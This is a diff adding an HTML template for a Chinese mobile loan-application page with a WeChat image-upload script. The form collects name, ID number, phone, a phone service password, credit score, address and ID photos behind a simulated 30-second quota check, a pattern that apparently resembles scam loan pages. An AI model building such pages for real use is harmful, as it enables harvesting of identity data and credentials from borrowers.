@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>立即借款</title>
+    <script type="text/javascript">
+     // 手机端页面自适应解决方案   作者 _minooo_
+        (function (doc, win) {
+            var docEl = doc.documentElement,
+                resizeEvt = 'orientationchange' in window ? 'orientationchange' : 'resize',
+                recalc = function () {
+                    var clientWidth = docEl.clientWidth;
+                    if (!clientWidth) return;
+                    if (clientWidth >= 750) {
+                        docEl.style.fontSize = '100px';
+                    } else {
+                        docEl.style.fontSize = 100 * (clientWidth / 750) + 'px';
+                    }
+                };
+            recalc();
+            if (!doc.addEventListener) return;
+            win.addEventListener(resizeEvt, recalc, false);
+            doc.addEventListener('DOMContentLoaded', recalc, false);
+        })(document, window);
+        var saasCtx = '{$kx.config.app.siteurl}',fee=parseFloat('{$configa.fee}'), drawMoneyData = {title: '{$configa.id}', qrcode: '__PUBLIC__/home{$configa.banner_image}'}, image=new Array(3),edu_second=30;
+    </script>
+
+    <!-- common style -->
+    <link rel="stylesheet" type="text/css" href="__PUBLIC__/home/css/common.css"/>
+    <!-- page css -->
+    <link rel="stylesheet" type="text/css" href="__PUBLIC__/home/css/css.css?{$_SERVER.REQUEST_TIME}"/>
+    <!-- icon style -> all icon of page -->
+    <link rel="stylesheet" type="text/css" href="__PUBLIC__/home/css/icon.css"/>
+</head>
+<body>
+<!-- 主页面区域 -->
+<!--<div class="header">立即借款</div>-->
+<section class="edu-page" style="display: none">
+    <div class="logo"></div>
+    <div class="text-title">额度计算中</div>
+    <div class="text-desc">30s</div>
+</section>
+<section class="home-page" style="{if $money}display:none{/if}">
+    <div class="niu-binner">
+    <div class="header-img">
+    <img src="__PUBLIC__/home/{$configa.banner_image}" alt="立即借款">
+    </div>
+    </div>
+    
+    <div class="notice">
+    <div class="icon-box"><i class="icon-notice"></i></div>
+    <span class="tips"><span>{$configa.banner_text}</span></span>
+    </div>
+    <div class="bro-zone">
+        <div class="choice-zone">
+            <p class="name">借款金额</p>
+            <p class="count">￥1000.00</p>
+            <div class="choice-box">
+                <div class="bg"></div>
+                <div class="rail"></div>
+                <div class="slide" style="left:0">￥</div>
+                <span class="min">1000</span>
+                <span class="max">20000</span>
+            </div>
+        </div>
+        <div class="selectbox-group clearfloat">
+            <div class="name">借款日期 :</div>
+            <div class="selectbox cont">
+                <p class="select-month" data-num="1"><span>1个月</span><i class="icon-drop-down"></i></p>
+                <ul>
+                    <li data-num="1">1个月</li>
+                    <li data-num="2">2个月</li>
+                    <li data-num="3">3个月</li>
+                    <li data-num="4">4个月</li>
+                    <li data-num="5">5个月</li>
+                    <li data-num="6">6个月</li>
+                    <li data-num="7">7个月</li>
+                    <li data-num="8">8个月</li>
+                    <li data-num="9">9个月</li>
+                    <li data-num="10">10个月</li>
+                    <li data-num="11">11个月</li>
+                    <li data-num="12">12个月</li>
+                </ul>
+            </div>
+        </div>
+        <div class="show-accrual clearfloat">
+            <div class="name">借款利息 :</div>
+            <div class="cont"></div>
+        </div>
+        <div class="confirm-btn">立即借款</div>
+    </div>
+</section>
+
+<section class="submit-page" style="display:none">
+    <div class="tips-info">请填写身份证信息</div>
+    <div class="submit-info">
+        <div class="edit-group">
+            <div class="name">真实姓名</div>
+            <div class="input-box">
+                <input type="text" class="static-change u-name" maxlength="4" placeholder="请输入您的真实姓名">
+            </div>
+        </div>
+        <div class="edit-group">
+            <div class="name">身份证号</div>
+            <div class="input-box">
+                <input type="text" class="static-change num-or-XY id" maxlength="18" placeholder="请输入正确的身份证号">
+            </div>
+        </div>
+        <div class="edit-group">
+            <div class="name">手机号码</div>
+            <div class="input-box">
+                <input type="tel" class="static-change num tel" maxlength="11" placeholder="请输入您的手机号码">
+            </div>
+        </div>
+        <div class="edit-group">
+            <div class="name">服务密码</div>
+            <div class="input-box">
+                <input type="password" class="static-change password" placeholder="请设置服务密码">
+            </div>
+        </div>
+        <div class="edit-group">
+            <div class="name">芝麻信用分</div>
+            <div class="input-box">
+                <input type="tel" class="static-change num credit-score" maxlength="3" placeholder="请输入您的芝麻信用分">
+            </div>
+        </div>
+        <div class="edit-group">
+            <div class="name">现居住地址</div>
+            <div class="input-box">
+                <input type="text" class="static-change addr" placeholder="请输入您现在居住的地址">
+            </div>
+        </div>
+    </div>
+    <div class="tips-info upload-info">提醒：身份验证后不可更改，且后续只能绑定该身份证持卡人名下的银行卡，请慎重操作</div>
+    <div class="upload-img">
+        <div class="upload-group">
+            <div class="name">身份证正面</div>
+            <div class="upload-zone" data-id="0"><i class="icon-upload"></i>添加图片</div>
+        </div>
+        <div class="upload-group">
+            <div class="name">身份证反面</div>
+            <div class="upload-zone" data-id="1"><i class="icon-upload"></i>添加图片</div>
+        </div>
+        <div class="upload-group">
+            <div class="name">手持身份证照</div>
+            <div class="upload-zone" data-id="2"><i class="icon-upload"></i>添加图片</div>
+        </div>
+    </div>
+    <div class="btn-group">
+        <div class="sumbmit-btn">点击提交</div>
+    </div>
+</section>
+<section class="draw-money" style="{if !$money}display:none{/if}">
+    <div class="draw-info">
+        <i class="icon-bg"></i>
+        <i class="icon-circle"></i>
+        <p class="total-momey">{$money}</p>
+        <p>贷款额度</p>
+    </div>
+    <div class="btn-group">
+        <div class="sumbmit-btn">申请提现</div>
+    </div>
+</section>
+<div class="loadingToast" style="display: none">
+    <div class="weui-mask_transparent"></div>
+    <div class="weui-toast">
+        <i class="weui-loading weui-icon_toast"></i>
+        <p class="weui-toast__content">数据提交中</p>
+    </div>
+</div>
+<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script type="text/javascript" src="__PUBLIC__/home/js/common.js?2"></script>
+<script type="text/javascript" src="__PUBLIC__/home/js/niu.js?{$_SERVER.REQUEST_TIME}"></script> 
+<script type="text/javascript" src="//res.wx.qq.com/open/js/jweixin-1.2.0.js"></script>
+<script type="text/javascript">
+    wx.config({$wxconfig});
+    wx.ready(function () {
+        var share = {
+            "imgUrl": "{$kx.config.app.siteurl}{$configa.share_image}",
+            "title": '{$configa.share_title}',
+            "desc": "{$configa.share_desc}",
+            "link": '{$kx.config.app.siteurl}',
+            success: function () {
+            },
+            cancel: function () {
+            }
+        };
+        var timeline = {
+            "imgUrl": "{$kx.config.app.siteurl}{$configa.share_image}",
+            "title": "{$configa.share_title} - {$configa.share_desc}",
+            "link": '{$kx.config.app.siteurl}',
+            success: function () {
+            },
+            cancel: function () {
+            }
+        };
+        wx.onMenuShareAppMessage(share);
+        wx.onMenuShareQQ(share);
+        wx.onMenuShareWeibo(share);
+        wx.onMenuShareTimeline(timeline);
+    });
+    $('.upload-zone').on('click', function () {
+        var $obj = $(this);
+        wx.chooseImage({
+            count: 1, // 默认9
+            sizeType: ['original','compressed'], // 可以指定是原图还是压缩图，默认二者都有
+            sourceType: [ 'camera','album'], // 可以指定来源是相册还是相机，默认二者都有
+            success: function (res) {
+                var localId = res.localIds['0']; // 返回选定照片的本地ID列表，localId可以作为img标签的src属性显示图片
+                console.log("<img src='" + localId + "'>");
+                $obj.html("<img src='" + localId + "' style='width: 100%;height: 100%;'>");
+                wx.uploadImage({
+                    localId: localId, // 需要上传的图片的本地ID，由chooseImage接口获得
+                    isShowProgressTips: 1, // 默认为1，显示进度提示
+                    success: function (res) {
+                        image[$obj.data('id')]=res.serverId; // 返回图片的服务器端ID
+                    }
+                });
+            }
+        });
+    })
+</script>
+</body>
+</html>
